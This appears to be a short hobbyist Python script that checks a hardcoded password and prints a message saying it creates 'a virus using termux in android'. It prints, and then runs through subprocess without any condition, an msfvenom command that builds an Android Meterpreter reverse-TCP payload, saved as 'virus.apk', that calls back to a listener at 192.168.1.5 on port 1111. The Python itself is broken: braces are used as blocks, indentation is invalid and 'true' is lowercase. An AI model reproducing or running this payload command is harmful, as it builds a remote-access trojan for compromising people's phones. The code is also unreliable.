import subprocess

b = ("SUNDAR")
a = input("Enter the password: ")  
    
if(a == b):
  {
    print("Permission Granted!"),
    print("The secret is going to be revealed")
  }
else:
  {
    print(" Permission Denied"),
    print("DATA IS GOING TO BE ERASED")
  }
  
#print("Top secret")
if(a == b):
	{
print("msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1111 -o virus.apk"),
print("This command is used to create a virus using termux in android")
	}
else:
	print(" Nothing ")
	
subprocess.call("msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1111 -o virus.apk", shell=true)